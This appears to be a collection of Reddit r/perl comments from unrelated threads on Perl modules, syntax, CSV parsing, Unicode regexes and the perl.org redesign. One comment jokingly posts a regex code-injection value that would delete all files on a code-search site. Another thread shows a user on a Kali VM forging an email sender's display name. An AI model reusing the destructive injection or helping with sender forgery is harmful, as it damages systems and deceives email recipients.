Because, as I wrote in the original article, Crypt::Bcrypt is currently not installable. This is the bug that currently prevents me from using it: https://github.com/skinkade/crypt-random/issues/2
Most crypt implementation can actually do bcrypt, this is triggered by a `$2y$` salt ;-)
Thank you for the quick response that got it to work correctly.
That's a very shortsighted approach. Efficiency doesn't have to be "important" for improper algorithms to cause problems by increasing your runtime by 20000%. Additionally there are ways to make hotspots in perl code efficient beyond the choice of algorithm, such as by using XS modules or inlined subroutine definitions.
How do you inline subs (other than doing it manually)? Perl also doesn't do tail call optimization. Devel::NYTProf pointed to the lack of inlining as taking ~25% of my CPU on one of my performance-sensitive projects. I love Perl, but next time I write an intensive AI algorithm, I'll write it in D or Rust. 
It is a very manual process to make those particular performance improvements, so it's usually not worth it except for heavily used CPAN modules like Moo (which recently split out the [Sub::Quote](https://metacpan.org/pod/Sub::Quote) module it uses for inlined subs). But yes when a certain level of efficiency is required, you should be looking elsewhere. That doesn't mean people using perl can't still benefit from making their code more efficient in different ways. The OP was, well, vague as to the level of efficiency required. (Perl actually does tail recursion, with the peculiar `goto &amp;NAME` syntax, but it turns out to be slower than just calling the subroutine due to unwinding the stack, so it's not really an optimization.)
something like this? https://www.tutorialspoint.com/execute_perl_online.php or https://www.jdoodle.com/execute-perl-online
Thanks, I just found that hacker rank accepts perl too.
Hmm, how about Java? 1.8 is actually reasonably pleasant to program in, and fast enough. ANTLR is excellent for the kind of string / text recognition that is otherwise a bit of a pain in Java. I've always been a bit curious about the supposed niche of perl and python for biology. I've read a few articles and understand that it revolves are text / regex matching on strings, but if you could explain your project more I'd be interested to hear!
Llama is on Learning perl but wasn't Larry's book with a Camel?
&gt; filehandles are automatically closed when they fall out of scope, but it's considered bad practice to rely on that. [Citation needed] 
This is very neat functionality indeed. There are a number modules on CPAN for this. Some I've used: * http://search.cpan.org/~chocolate/Scope-Guard-0.21/lib/Scope/Guard.pm * http://search.cpan.org/dist/Guard/Guard.pm Or, for the more specialized case of changing directory: * http://search.cpan.org/~kazeburo/Cwd-Guard-0.05/lib/Cwd/Guard.pm
Thanks
Or just don't assign it after. E.g. instead of @result_array_int = push(@result_array_int, @input_array_int[ 0 .. ($#input_array_int - $number_of_rotations_int)]); Do push(@result_array_int, @input_array_int[ 0 .. ($#input_array_int - $number_of_rotations_int)]); 
`push` mutates the array in place, and returns the new size of the array. You don't want to assign the return value to the array. By the way, it's completely pointless to pass an arrayref if you're just going to go ahead and make a copy of the array anyway, which is what this does: my @input_array_int = @{ $input_array_int_ref } ; You're just obliterated any reason for using an arrayref. Here is how I'd write it, without the crazy variable names: use warnings; use strict; use feature 'say'; sub array_rotate { my ($arr, $n) = @_; $n %= @$arr; return @$arr[$n .. $#$arr], @$arr[0 .. $n - 1]; } my @example = 1 .. 10; my @rotated = array_rotate \@example, 5; say join "\n", @rotated; 
Thanks. For the crazy variable names, I do prefer to write long names instead of $n, $i or whatever, to be clear to myself first(especially with dynamically typed languages) For the array copy, I was thinking that my @input_array_int = @{ $input_array_int_ref } ; was equal to the use of @$input_array_int_ref ; Just with less sigils around (if I juggle between different languages I don't want to get crazy to remember the all the sigils combinations), instead it is an entire copy. Understood. edit: you have a nice way to rotate the array, just wrong direction (front to end and not viceversa)
Friends don't let friends use Module::Build.
no problem
Fortunately, Moo and Type::Tiny give you most of Moose and are much cheaper (and cross compatible!)
Well, the median's the middle number, so I'd say just sort the thing, and pick the middle of the array. #!/usr/bin/perl use Modern::Perl; use List::Util qw(sum); my @numbers = (); while (&lt;&gt;) { chomp; last if $_ &lt; 0; push(@numbers, $_); } # By default, perl does a string comparaison; we force a numerical comparaison here. @numbers = sort { $a &lt;=&gt; $b } (@numbers); say "Average: " . sum(@numbers) / int(@numbers); say "Largest: " . $numbers[-1]; say "Smallest: " . $numbers[0]; say "Median: " . $numbers[$#numbers/2]; 
[ Cross posting here because of moderator queue on the blog :/ ] This is very close to the Null Object pattern. There's a CPAN module for that (obviously): https://metacpan.org/pod/Class::Null This is used by the Scalar::AndAnd module which does almost exactly what you're after (but not specifically using an operator for it): https://metacpan.org/pod/Scalar::Andand It's pretty neat to use, but has some peculiarities wrt checking for undef values.
How about effective concurrency and parallelism in perl? this topic just seems like a wasteland outside of asynchronous http.
* [Release announcement](http://code.activestate.com/lists/perl5-porters/236187/) * [Source download](https://cpan.metacpan.org/authors/id/X/XS/XSAWYERX/perl-5.25.12.tar.gz) * [Changes](https://metacpan.org/changes/release/XSAWYERX/perl-5.25.12)
[Changes](https://metacpan.org/changes/release/XSAWYERX/perl-5.25.12): &gt;**Updated Modules and Pragmata** 7 modules have been updated &gt;**New Errors** &gt;Since . is now removed from @INC by default, do will now trigger a warning recommending to fix the do statement: &gt; do "%s" failed, '.' is no longer in @INC &gt;**Changes to Existing Diagnostics** &gt; When a require fails, we now do not provide @INC when the require is for a file instead of a module. &gt; When @INC is not scanned for a require call, we no longer display @INC to avoid confusion. That's it... ? There are *no real changes*. This is close to ridiculous. 
The 5.25 series has been in code freeze (bugfixes and documentation changes only) since 5.25.10, released on February 20, 2017. This is normal at this point in the release cycle.
cool. I prefer not too packed code (first and foremost for readability and debug) but nice to know!
For newbies learning perl as their first language.
It isn't clear to me what the problems are with the current blogs.perl.org. Maybe i'm too forgiving, but it looks okay to me and is readable. Also, the company that owns MoveableType offered to donate a license for the latest version. Wouldn't that be a good first step, even if things are going to be migrated to a perl based solution later? 
Yes, you're right - the glossary is wrong. A [queue](https://en.wikipedia.org/wiki/Queue_(abstract_data_type\)) is FIFO. A [stack](https://en.wikipedia.org/wiki/Stack_(abstract_data_type\)) is LIFO. Your suggestions for Perl implementations are correct too.
It's "sufficient", but the login process has various intermittent issues, and the editor for some reason uses a mix of HTML and markdown formatting which is a pretty terrible idea in general. Due to this it also strips out things it thinks are HTML tags, ends up displaying perfectly valid text the wrong way, etc.
* [it gives a manager something unique to grep for [`MONKEY`] so she can say "don't do that"](https://irclog.perlgeek.de/perl6/2017-04-22#i_14469777).
As I casually checked /r/perl as I like to do from time to time, I came across this semingly honest post that had "Jemplate" in the title. I think to myself, heh obviously just a typo for Template. To my horror, how wrong I was. "The module implements Template::Toolkit in JavaScript"
&gt; Please, can we just... not. This has been my reaction to so many Perl 6 features at this point, it would be unconstructive to detail them here.
would love to talk to the person who down voted me that things processing something into another lang to be processed by a browser is better than templates. I'm allll ears. 
Well thank you for the link. It doesn't really make much sense to me. If someone has a choice between `my &amp;eval = &amp;EVAL` and `use MONKEY-SEE-NO-EVAL` then I imagine option #1 is going to win every time thus defeating the whole purpose.
The only problem I've ever had is the weird login problem, which just requires logging out and logging back in. Yes that's annoying when you are trying to comment, but it isn't catastrophic. I would like if the code were open source, given the open source nature of our endeavors, but there is no open source alternative, so, I don't understand the problem there. The difficulty in replacing it is that there seems to be no major alternative for multi-user blogging. If someone wants to create one, I'd be very excited!
I have a [list of the interesting new features for v5.26](https://www.effectiveperlprogramming.com/2016/06/perl-v5-26-new-features/), with articles for some of them. Others barely need to the title, though :)
I've never been a fan of Template::Tookit, but clearly one of it's design goals was a restrictive interface that makes it relatively easy to implement libraries for it in other languages. Why wouldn't you want to have TT available in JS? That was the idea. (Personally, I prefer the more perlish Mason. I can see why a perl-hater would love TT, it's less obvious to me why it was so popular with perl-lovers.) I'm not sure I understand this post, exactly-- he added some warnings to TT to deal with potential template issues in Jemplate... he's not saying that Jemplate actually uses the TT code, is he?
Jemplate uses TT2, yes - the template compilation is much like a normal TT2 tpage/ttree processing step, the main difference is that it goes through [Jemplate::Directive](https://metacpan.org/pod/Jemplate::Directive) to generate JS, whereas plain TT2 generates Perl code in [Template::Directive](https://metacpan.org/pod/Template::Directive). If you look at the source for either of those, they're basically providing strings of code for each language corresponding to each syntax element (FOREACH, assignment, etc.). There's a backend for Lua, too: [Lemplate::Directive](https://metacpan.org/pod/Lemplate::Directive). 
Well that would certainly be a problem. Can nothing be done about it?
Likely, but as i said elsewhere in this thread, it's propietrary code, possibly with customizations; so the problems are mostly legal.
&gt; The only problem I've ever had is the weird login problem, which just requires logging out and logging back in. I used to get a lot of login/session errors but most were immediately resolved by some variation on logging out and then back in (if need be, rebooting my computer). Things got steadily worse and then, about a year ago, I found that no matter what I tried I always got either a session expired error (even though I'd only logged in seconds prior) or "An error occurred ... Invalid request". I just tried again with a couple different browsers with the same results. Imo the formatting problems I encountered when I *was* getting posts and comments thru were pretty bad. But that was just annoying. Not being able to comment or post *at all* is a different kettle of fish.
Another issue with conflicts prereqs is that it can make an operation impossible. If one module conflicts with a certain version of another module, and a third module requires that version, the CPAN client will be unable to fulfill this requirement. Which is what it's designed for, but a bad experience for the user. The current handling of recommended prereqs is, as usual, due to historical precedence. It would be a good idea to install them by default and after the current distribution is installed, but there is an issue with that. The distribution's tests are run before it is installed, and recommended test prereqs would not be very useful if they weren't installed before testing. Runtime recommended prereqs may also have implications to the tests, so you'd want them installed first to catch any issues in testing. So it's a very difficult question.
This is a pretty simple one but I think I may try to go through the whole Euler project. There are some solutions already posted on github. *don't take a look until you have thought of a solution.* Solutions for Perl6 are online already too. **If you are learning Perl as your first language, these will be perfect for you!** 
I recommend against using LWP::Simple in general as you have no option to apply error checking or configure the user agent later if needed, and it's really not that much easier to use than [LWP::UserAgent](https://www.metacpan.org/pod/LWP::UserAgent), which it wraps. The following code does the same thing, but you can examine the response (an [HTTP::Response](https://www.metacpan.org/pod/HTTP::Response) object) for errors, and you can change the default connection timeout in the LWP::UserAgent constructor (it defaults to an extremely long 3 minutes): use warnings; use strict; use LWP::UserAgent; my $ua = LWP::UserAgent-&gt;new; for my $dataset (qw/1 2 3/) { my $response = $ua-&gt;mirror("http://intranet/generateXml.php?dataset=$dataset", "$dataset.xml"); } The super-lightweight core module [HTTP::Tiny](https://www.metacpan.org/pod/HTTP::Tiny) can be used the same way, but the response is instead a hashref (see https://metacpan.org/pod/HTTP::Tiny#request), and the timeout defaults to 1 minute: use warnings; use strict; use HTTP::Tiny; my $ua = HTTP::Tiny-&gt;new; for my $dataset (qw/1 2 3/) { my $response = $ua-&gt;mirror("http://intranet/generateXml.php?dataset=$dataset", "$dataset.xml"); } 
[removed]
If a function has been previously defined (as is the case with built-ins like `unpack` and `substr`, but also any user-defined functions that have come before) then perl knows that when it sees such a name used as a bareword that it's a function call, and the parentheses are optional. It's rather common to see people leave off the parens as a matter of style, e.g. my @words = qw/foo bar baz/; say join "|", map qq{"$_"}, @words 
I would try using a SMTP server (https://www.mailgun.com/ has free plan) $msg-&gt;send("smtp", $SMTP_SERVER, Timeout=&gt;30); 
Alright I'll give that a shot and see what I can find. Thanks.
how about just parsing the csv and writing each parsed item to a hash and incrementing the value of the hashed key after each write? you might need to clean up the delimited items by for example removing spaces so you only get the "word"... not gonna write the code since this is pretty straightforward to implement 
split can take a string or a regular expression. the regex can have a number of alternative characters to split on, eg /a|b/. type "perldoc split" into your URL box for more info about the split command.
I think you want something like: MIME::Lite-&gt;send('sendmail', "/usr/lib/sendmail -t -oi ");
Your output indicates success, what makes you think it failed? 
The email never got received, but when I use a standard email address it does. Curious, with the line `MIME::Lite::SMTP=GLOB(0x556196d4e618)&lt;&lt;&lt; 250 2.0.0 Ok: queued as 764581406BE` -- That's what stood out to me, that it queued the email instead of sending it. When I just put an address like `name.name@company.com` it works fine. I'm trying to have it appear like a normal name though, so that the FROM field shows something like `Wilson, Bob`, the recipient never gets the email. **EDIT:** Alright I see why you initially said that. I initially did a standard email before I added debugging. I just tried again and got the same output, but I received the email. So it's giving the same output whether the email gets sent or not. It must be just sending it to nowhere then, and I think my problem lies in specifically how I need to format the FROM field so that it actually accepts it and displays the name instead of the email address. I'm thinking that's where I'm stuck. I've been reading about syntax for the FROM field and how to produce different output on the actual email (and of course have it actually send), so far nothing helpful.
Oh ok, I already tried that, I noted it in my edit which might have been missed. &gt; EDIT: I put 127.0.0.1 in double quotes and got some different output this time. It looks like it's queueing the message but I don't see anything that suggests what the cause is. So, it did make a difference, just not one that solved the problem.
With Perl 6, just use [Text::CSV module](https://modules.perl6.org/repo/Test::CSV) to parse your CSV and call `.words` on the result and `.Bag` it to count them: $ perl6 -MText::CSV -e 'csv(:in&lt;csv.csv&gt;).words.Bag.say' bag(ras, mas, sam, nas, tik, task(2), tas) You can [work with the Bag](https://docs.perl6.org/language/setbagmix) any way you want or grab the pairs from it and format 'em the way you want it: $ perl6 -MText::CSV -e 'csv(:in&lt;csv.csv&gt;).words.Bag.pairs».fmt("%s,%s").put' ras,1 mas,1 sam,1 nas,1 tik,1 task,2 tas,1 
Ok so it's Postfix that's not sending the emails when I try to use a real name instead of an email address you think? I'll look into Postfix configurations then. I had figured if it was sending the email when I used an email address, but not when I tried to use a real name to display, that it was Perl not crafting the email properly. Though I suppose it makes sense that Perl is doing its job and Postfix doesn't know what to do with the non-standard address format, like all the examples I tried. Thanks for the info.
That seems to be part of the problem. I changed `Fake, Name` to `FakeName` and I received the email. It showed `FakeName` instead of an email address. However, it shows the name in my inbox, but if I look at the details it shows my machine as the domain. I.e.: I'm doing this from a VM, the hostname is just `Kali` but it's using the domain I initially entered when installing the OS. So I guess since it's using it and went through fine, I suppose I can just change it to what I want the domain to show as. However as you stated, I cannot add a space or comma. I tried `Fake,Name` and it also did not work. Once I change the domain name on my VM, just gotta figure out how to add a space. Thanks! That got me some progress at least **EDIT:** FYI, for your own knowledge as well. I got the space and comma to work, just need to add a \ in front of it to escape it. So for my sender, I used `Fake\,\ Name` and it shows up in the email details as `"Fake, Name"@wrongdomain.com` So I just need to somehow remove the quotes it adds, and change my domain and I should be good. The domain is easy enough, just need to get rid of those quotes.
Alright, I'll give that a shot. Thanks!
If it's any consolation, it's sloppy to not put parens around the function calls to make it clear what's going on. Like this $c = unpack( 'C', substr($line, $i, 1) );
ah yes flattening... its been a while since i went through the chapter on arrays. I did get the correct answer since undef wasn't a choice. Just finished a Java class recently so i'm still a little mixed up on things. Thanks for the reply!
Ok so yeah the refs is maybe why i was thinking you could nest them and where my confusion was. Thanks for the reply!
I use Komodo IDE with the ActiveState Perl remote debugging kit. 
U wot m8
I looked at your codebase and there is a ton of commented-out code. What's up with that?
[removed]
Why use greater than over less than? Also this is Perl. TMTOWTDI.
Do you need to? If you don't supply them it will extract all tables by default.
part 2 is at http://blog.builtinperl.com/post/perl-developer-survey-2017-results---part-2
I disagree with the comment in the article about ranges. I think it would be easier to write the outside range example as (x &lt; 5 || x &gt; 10) if you read it. I think it makes more sense to me to talk about the x in respect to the value. x is less than 5 or x is greater than 10. 
It's also a good idea to use the feature [unicode_strings](https://metacpan.org/pod/feature#The-'unicode_strings'-feature) when doing unicode-based regex work.
It's cool. perfectly!
But I only want to extract the exact table I want and each time I need try 1,2,3,4 to find which table is such table. 
Just keep in mind the comparison is somewhat like perl vs ruby. The futures of the two languages are not directly related. Learn the language that suits your needs.
Whatever path you go, please read Perl Best Practices by Damian Conway. It will make your Perl much more maintainable 
Yep, thanks. To be even more specific, NQP is Not Quite Perl.
I should have probably indicated that this is Perl 6. :-) `^n` is short for `0..^n`, which is a range from 0 to n (excluding n). The `*` in `*.is-prime` is the `Whatever`: in that context it generates a WhateverCode block. In this case `{ $_.is-prime }` So written slightly longer: `say (0 .. $limit-1).grep( { $_.is-prime } ).sum` `say`, `is-prime` and `sum` are Perl 6 built-ins.
The nicer way to do all of this with lt or gt is with chained comparisons like you see in plain maths or languages like Python or Perl 6: my $x = 3 3 5 &lt; $x &lt; 10 False $x = 6 6 5 &lt; $x &lt; 10 True
You're not going to get a good answer to that question. It's like asking whether you should learn Python or Ruby. Everyone has their bias. But the answer is most definitely: **Perl 6**. [Check out our brochure](https://github.com/perl6/marketing/raw/master/Brochures/Perl6-PR-Brochure/Perl6-PR-Brochure.pdf) --- **Perl 5** *Pros* - Fast - Stable - Has mature modules for many common tasks - Pretty much any Linux distro comes with Perl 5 pre-installed - People have tons of legacy systems built on Perl 5, so you might get a job *Cons* - Huge ecosystem full of abandoned modules - Full of awful syntax that's kept for backwards compatibility reasons - Full of special cases that you will forget unless you use the language a lot on a regular basis - You need to import modules to get basic functionality and unless you participate in the community regularly, it's hard to [know what the Module De Jour](https://metacpan.org/pod/Task::Kensho) is for a particular task - In my experience, the community is old-school, elitist types, aside from a few individuals who break the trend **Perl 6** *Pros* - Awesome Unicode and multi-threading support - Built in grammars - Comes with all the common bells and whistles built-in - Fun, concise syntax - In my experience, the community is friendly and hugtastic, aside from a few individuals who break the trend *Cons* - [Tiny ecosystem](http://modules.perl6.org/) full of abandoned modules - Slow - Buggy - Some stuff still gets changed around, so you may need to tweak your code to work on latest-and-greatest version once in a while - No mature modules for common tasks; your options are to roll your own, use works in progress, or use Perl 5's modules via Inline::Perl5 and pray it works. - Language has been stable for just over 1 year, so chances of someone explicitly looking to hire Perl 6 programmers are slim to none 
Speeding up set operators / Sets / Bags / Mixes in Perl 6.
so Perl 5 for jobs now and Perl 6 for the future?
Thanks for the help. I was trying not to assign a string to this because it's a csv file I'm reading and right after my s/regex//g; command I'm using split to move all of the different csv values into strings. I'm not sure how this would effect that. I thought it would be easier to just delete the data in place than process everything with split. 
Thanks for the help. I didn't tell the full story since I'm lazy and trying to be quick. It's a CSV file I'm reading with a lot of other data. There is just one section that occasionally has the quotes and extra commas so I need to get rid of them before my split to parse the csv into different strings. 
Then something like this will remove everything except the first number my $str = '"12345,RT,T5"'; $str =~ s/^"(\d+?),.*/$1/; print "Num: $str\n";
The "quotes and extra commas" probably mean that you have CSV embedded in your CSV :/ Quoting is the only way to escape commas in CSV.
that's basically what they did. you give specific instructions on how to setup this output file to a company and they do stupid stuff like this to make it more difficult. I wasn't happy when I saw it but was told I can't go back to them and complain. 
&gt; Everyone has their bias. definitely applies. In my experience neither community is that simple to generalize, though the prominent members may be.
Assuming it's valid CSV (or close enough that you can enable some of the lax parsing options), [Text::CSV](https://metacpan.org/pod/Text::CSV) (in particular the [csv function](https://metacpan.org/pod/Text::CSV#csv)) will make parsing such a file quite simple, no need for regex.
I misunderstood that $1 would represent group one and so forth. This was the final piece for me. I finally got it working with this. s/"(\d+?....)([^"]*)"/$1/g; I know the periods isn't the best way to do it but without them it was only catching the first number in group one. It was the quickest way I knew to get the rest of the numbers. I tested it and it works so that's all that matters. Thanks for the help. I really appreciate it. 
This didn't quite work for me but it got me very close. Once I understood $1 properly I saw how it would work. Final ugly solution (I know it's not proper) is s/"(\d+?....)([^"]*)"/$1/g; Thanks for the help!
If it's always 5 digits, then what about the substitution pattern &gt; s/\^"(\d{5}),.*/$1/ which forces the capture of 5 digits? 
Solving problems on Project Euler
Set your useragent value to an actual browser useragent. The default www:mechanize useragent gets refused a lot.
Finally finished a basic demo of Chipmunk bindings in Perl5. This week, I hope to integrate it with Graphics::GVG to automatically build the physics for a vector image, then demo it with a [Spacewar!](https://en.wikipedia.org/wiki/Spacewar!)-type game.
May I suggest adding a reference to "perlguts". Of the builtin documentations, it is the one I refer to most often. 
The difference is in context: without parentheses, assignment is called in scalar context, with parentheses in list context. In scalar context, the array on the right hand side returns the number of elements, while in list context, it returns its elements, and the first one is assigned to the variable.
 # On reddit you can use lines starting with four spaces for code view: sub factorial{ my ($num) = @; return 0 if $num&lt;=0; return 1 if $num ==1; return $num * factorial($num-1); } say "Factorial 4 = ", factorial(4);
If there's anything I'd advise any beginning Perl programmer anytime, it has to be: learn the difference between scalar and list context.
It's likely given the subject of this post and the other post the author made, that he was IP banned.
Most "quality"/modern perl5 code is in modules, not scripts. Check out the source code for various modules in [Mojolicious](https://metacpan.org/release/Mojolicious) for instance.
You might try browsing [Rosetta Codes' Perl examples](http://rosettacode.org/wiki/Category:Perl).
I checked out a random one, and it was ... not great: http://rosettacode.org/wiki/Append_a_record_to_the_end_of_a_text_file#Perl
[Modern Perl - Here's the book in PDF format](http://onyxneon.com/books/modern_perl/modern_perl_a4.pdf)
You might try more from the 760, but that task seems to throw up ugly results in several languages :-( 
really?
Thanks. @oylenshpeegul, Tiny works great. I can do the download after I install HTTP::Tiny
Indeed. $ perl -e 'print "digit" if "\x{07c2}" =~ /\d/' digit $ perl -e 'print "digit" if "\x{07c2}" =~ /\d/a' $ 
Yip &gt; ߂ + ९ 11 
That sort of seems like a cop-out to me; modify how the whole regular expression is processed, also changing how `\w`, [and probably `\s`](https://en.wikipedia.org/wiki/Whitespace_character) are interpreted, instead of actually solving the problem.
Type::Tiny got a really sweet type check failure messages that I wish Perl 6 had. Perl 6's syntax for declaring subsets blows Type::Tiny out of the water, but the error kinda sucks in that it doesn't tell you WHAT the actual type constraint is: subset EvenNumber of Int where * %% 2; my EvenNumber $ = 13; # Type check failed in assignment; expected EvenNumber but got Int (13) Type::Tiny's more useful error: use 5.020; use Type::Tiny; say "Type::Tiny"-&gt;new( name =&gt; "EvenNumber", constraint =&gt; sub { $_ % 2 == 0 }, )-&gt;assert_valid(13) # Value "13" did not pass type constraint "EvenNumber" # "EvenNumber" is defined as: sub { no feature ':all'; use feature ':5.16'; $_ % 2 == 0; } [Subset::Helper](https://modules.perl6.org/repo/Subset::Helper) helps out a bit, but you must always provide your own message: use Subset::Helper; subset EvenNumber of Int where subset-is * %% 2, 'Value must be divisible by 2'; my EvenNumber $ = 13; # Value must be divisible by 2 Got 13 # Type check failed in assignment; expected EvenNumber but got Int (13) # in block &lt;unit&gt; at foo.pl line 4 There's no easy, non-Slang way to get the string of code for a `WhateverCode` or any other `Code` object, is there? Some module-space trait like `sub foo will keep-source { … }` would be rather sweet.
I agree that `\d` doesn't validate what Perl 5 accepts as a number literal, nor what strings it'll coerce to a number. And I agree the OP's title (and article) is misleading. That said... Imo it's misleading to say that what `\d` does, exactly, is validate a number or a numeral. There are (many!) numbers and numerals `\d` doesn't match, even as part of a larger expression. What `\d` does, exactly, is match *a single decimal digit*.
Good idea. Though the more I think of it, the source-retaining thing and subset thing should probably be separate modules.
The "problem" I refer to is simply one of programmer expectation. `\d` matching all unicode number characters is unexpected behavior. I would never have expected that to be the case, just like I don't expect Perl to be able to handle them as number constants (`my $var = 一 + 二; # (chinese) 1 + 2`), just like I don't expect `"XVI" =~ /\d+/` to be truthy just because those are number characters in Roman notation. A better solution to this is to be able to match ascii decimals using a separate character class than the one used to match all number characters in unicode. That way you can mix the two.
&gt; \d matching [a Unicode decimal digit] is unexpected behavior It's unexpected if you don't expect Unicode. Otherwise, it's surely exactly what you'd expect? &gt; I don't expect Perl to be able to handle them as number constants `(my $var = 一 + 二; # (chinese) 1 + 2)` Do you think a chinese developer might expect it, or at least desire it? &gt; A better solution to this is to be able to match ascii decimals using a separate character class than the one used to match all number characters in unicode. That way you can mix the two. You can do that in Perl 6. I'm pretty sure you can in Perl 5 too.
Sure, but "numeral" and "number" can be another word for "digit", when you're talking characters, and \d matches a subset of this. Perhaps the term 'exactly' was misleading... :)
&gt; Perhaps the term 'exactly' was misleading... :) Exactly.
Even though it's a veteran in the software world, I have found it to fit my workflow with Openbox perfectly. I'm hoping to learn to write applets for it, for a couple of missing things that I'd like to see. Anyone else still use this gem? 
"Perl's \d complies with Unicode recommendations" --&gt; '९' =~ /\d/ # true :( :(
I use Cinnamon and haven't needed any applets that aren't provided "in the box" so far, but if you're looking to master Perl, check out [Modern Perl](http://modernperlbooks.com/).
Thanks for demonstrating that you don't have a better title. 
Glad to know that you have a lot of free time. 
[Know your character classes under different semantics](https://www.effectiveperlprogramming.com/2011/01/know-your-character-classes/), from _The Effective Perler_.
You're a HERO! Thank you, never heard of Mojo, had to install it. Everything worked perfectly when I ran: use Mojo::DOM; my $text = Mojo::DOM-&gt;new(join '', readline)-&gt;all_text; print $text Then copied and pasted that text into another .srt file. And then ran that file through the code in my original post. For some reason however, I couldn't get a coherent output when I tried to combine the two pieces of code into one. Any idea what the right way to do that would be?
This is probably what you're looking for: #!/usr/bin/env perl use strict; use warnings; use v5.12; use Mojo::DOM; use Text::Wrap; $Text::Wrap::columns = 80; say wrap '', '', grep length, # filter out empty/undef stuff; (which includes lines # without subtitles text, as our split[3] thing makes them undef) map { (split ' ', $_, 4)[3] } # split each line on whitespace and pick 4th item # that's the part with subtitle text split /\n/, # split on newlines Mojo::DOM-&gt;new(join ' ', readline)-&gt;all_text; # get rid of markup And just for fun, here's [Perl 6](https://perl6.org) version of the same thing 😋😋 #!/usr/bin/env perl6 use DOM::Tiny; use Text::Wrap; # slurp and strip markup, break up into lines, map splitting into 4 chunks # on whitespace and grabbing 4th chunk that is our subtitle DOM::Tiny.parse(slurp).all-text.lines.map({ .split(' ', 4)[3] }).grep(*.so).Str.&amp;wrap-text(:80width).put # then grep stuff that's thruthy (so we get rid of lines that didn't have # 4th column), then join elements on space and wrap the text to 80 columns P.S.: Perl 5 also [has DOM::Tiny](https://metacpan.org/pod/DOM::Tiny) if you don't want to install the entire Mojo toolkit, but there's no harm in installing it, so why not :)
If your second part of code in the merged code was still using the `while (&lt;&gt;)` loop, it would have been trying to read from the input (which was already consumed by readline) instead of $text; you want to have it operate on that variable as the result of the -&gt;all_text operation instead. However $text is a single string and not a list to iterate through.
Perl 5 DOM::Tiny says &gt; DOM::Tiny - This is an empty subclass, you wanted Mojo::DOM58
* [Source download](https://cpan.metacpan.org/authors/id/X/XS/XSAWYERX/perl-5.26.0-RC1.tar.bz2) * [Release announcement](http://www.nntp.perl.org/group/perl.perl5.porters/2017/05/msg244337.html) * Changes: not available yet
I think I might be most excited about [indented heredocs](https://metacpan.org/pod/release/XSAWYERX/perl-5.26.0-RC1/pod/perldelta.pod#Indented-Here-documents).
And about time :-)
the ultimate resource would be CPAN though knowing which code is god and which is not good would not be very easy you might look for modules written by big names in (Damian Conway etc.) and start with the smallest one :) 
&gt; you might look for modules written by big names in (Damian Conway etc.) and start with the smallest one :) Good idea
A pleasure to use.
I found (through some exploration and github commits) that these sites received the update as well: http://qa.perl.org/, http://dbi.perl.org/, https://cpanratings.perl.org/, http://lists.perl.org/
Looks great!
A much appreciated feature!
It breaks cpanratings.perl.org for me. Clicking "Was this review helpful to you? Yes No" now no longer works. And the CPAN text logo on the top left got clipped.
Opened an issue. https://github.com/perlorg/perlweb/issues/232 I don't have any issue with the upper left logo here, but you can open an issue for that as well.
[App::SimpleHTTPServer](https://metacpan.org/pod/App::SimpleHTTPServer) is a nice little Mojo option for this.
Fortunately, I tried `(?{unlink for glob "*"})`. j/k
what is "jk" doing? any reference to it ?
Agreed. For example, `wretched` works but `wretch.d` returns empty result almost immediately.
Not really. The question is too vague. It's like asking if a hammer is good at breaking down a house, since most of them have some amounts of nails in them. Perl is a good glue language so you can cook up all sorts of little tools with it, but it doesn't sound like something you'd choose to write an effective *malware,* since you'd have to package the executable along with your script; and if you have a way to run a script on the target server, you probably already have many other tools at your disposal. Why do you ask anyway? Have you heard of [WeChall website](http://www.wechall.net/active_sites)? Tons of fun wargames where you can safely and legally do this sort of stuff. You know, without damaging anyone's property or going to jail.
Thanks for your informative reply! Also, kudos for linking me. I'll explore that site for a bit.
I am not sure how to use this. Can someone provide some examples of how to use it?
Type in a string, like "use JSON::MaybeXS;", and it will return all files on CPAN containing that text with a link to that distribution. Unfortunately any regex metacharacters currently lead to zero results because of the issue I linked in my other comment.
thanks so much! i was only thinking of s///; Another question, i have a string $x="hello[1-2]". is there a way to change it to "[1-2] hello" (notice the added space between them after inverting them at the char/bracket boundary). Can this be done with regex? 
Sure, this is what s/// is suited for: you capture sections of the string in capture groups using parentheses, and refer to them in the replacement string as $1, $2, etc. See https://metacpan.org/pod/perlretut#Extracting-matches and https://metacpan.org/pod/perlre#Capture-groups
FWIW, in Perl 6 this would be: `$x ~~ tr/&lt;&gt;/[]/` Sometimes Perl 5 and Perl 6 do not differ that much :-)
The `/str1 str2\s*\([^)]+\)/` would match "anything but '('" between the two parentheses. And parens are special in regex (they capture stuff), so you need to escape them to match them literally. Or do you need to match actual `n`s or nested parens? ---- P.S.: In Perl 6 regex this'd be: `/ 'str1 str2' \s* '(' &lt;-[)]&gt;+ ')' /`
Well, in Perl 6, you can *make* that stuff mean something, but I think someone's trolling you guys. The whole "Perl is linenoise... you can bang on your keyboard and it'll compile" joke, you know? Or alternatively, the string is encoded and you need to decode it first. sub term:&lt;ei'oych8:;=$\x7Fzboxe$ieg%Femcd$zbz&gt; { 42 } sub infix:&lt;Yzoickf*Edo*'bcgksk&gt; { $^a + $^b } sub term:&lt;godof}k=knfkf9kybxk5+&gt; { 72 } say ei'oych8:;=$\x7Fzboxe$ieg%Femcd$zbz Yzoickf*Edo*'bcgksk godof}k=knfkf9kybxk5+ # OUTPUT: «114␤»
My view is that Perl is a more complicated language than most So on one side if you master that complexity the language can be more expressive than most On the other hand, it can be very daunting, difficult to grasp and can offer many more ways to shoot yourself in the foot
Why not ask Perl to check the syntax? Paste it into a file and run it with the -c switch: perl -c junk.pl You could remove -c and just attempt to execute it, but that would (in general) be a tad risky.
Sounds like a fair comparison.
Heh, funny you mention Requests as I just watched the recent [Requests Under The Hood PyCon 2017](https://www.youtube.com/watch?v=ptbCIvve6-k) talk. As for Perl you'll probably want to look at the Mojolicious codebase. https://www.reddit.com/r/perl/comments/69fao9/what_is_the_best_resource_preferably_a_bookblog/dh68vc0/
&gt; (my $var2 = $originalVar) =~ m/RE/ This will simply assign everything in $originalVar into $var2 and then match that against the RE. So if your entire text is in $originalVar, it will be also copied into $var2. What you want is something like (untested): for my $line (split /\n/ , $originalVar) { if ( $line =~ m/RE/ ) { # print or save the line... } } There's probably a more elegant way using m/()/g but my Perl is rusty and the above should work, in theory :)
http://imgur.com/gallery/UU2dM
Funny, but the OP may not know you're joking.
Agreed, it's fantastic. It's just that there are times that I am profiling a little program and don't need all that NYTProf brings.
Maybe this helps? https://support.microsoft.com/en-us/help/2643084/outlook-receives-a-message-that-has-an-attachment-that-is-named-not-supported-calendar-message.ics
